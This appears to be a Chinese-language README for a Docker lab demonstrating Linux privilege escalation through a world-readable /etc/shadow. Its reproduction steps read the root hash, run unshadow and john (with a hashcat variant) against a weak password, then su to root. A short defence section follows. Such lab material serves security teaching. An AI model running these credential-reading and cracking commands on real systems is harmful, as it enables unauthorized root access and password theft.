# /etc/shadow 可读提权（john 破解）

## 原理

/etc/shadow 存放所有用户密码哈希，正常权限 640（仅 root 和 shadow 组可读）。
当 shadow 对普通用户可读（644 等）时，把哈希抄走离线破解（john/hashcat），
破解出 root 密码即可 su root。真实环境中 root 密码往往复用其他服务密码，
且用户常使用弱密码。

## 环境

- 基础镜像：ubuntu:20.04（内置 john）
- 低权限用户：lowpriv / lowpriv123
- root 弱密码：password123
- 漏洞配置：/etc/shadow 权限 644

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 确认权限并读取哈希
ls -l /etc/shadow
# 预期输出: -rw-r--r-- 1 root shadow ... /etc/shadow   (644, 可读!)
cat /etc/shadow | grep '^root'

# 4. 合并成 john 格式
unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt

# 5. john 破解
echo -e 'password123
123456
toor
admin' > /tmp/dict.txt
john --wordlist=/tmp/dict.txt /tmp/hashes.txt
# 预期输出: password123 (root)   破解成功!

# 6. 登录 root
su root
# 密码: password123
# 预期输出: root@...:/#   提权成功!

# 7. 一键利用
bash exploit.sh
```

## 为什么能成功

- unshadow 把 /etc/passwd 和 /etc/shadow 合并成 john 认识的格式
- 演示环境 root 密码故意设为弱密码 password123，john 秒破
- 攻击机可用 hashcat 加速：hashcat -m 1800 -a 0 root.hash rockyou.txt

## 防御

- /etc/shadow 权限必须为 640（属主 root:shadow）
- 强密码策略，避免弱口令
- 定期检查：stat -c '%a %U %G %n' /etc/shadow

## 验证记录

2026-08-26 真实环境验证：john 输出 `password123 (root)`，破解成功，
`su root` 提权成功。
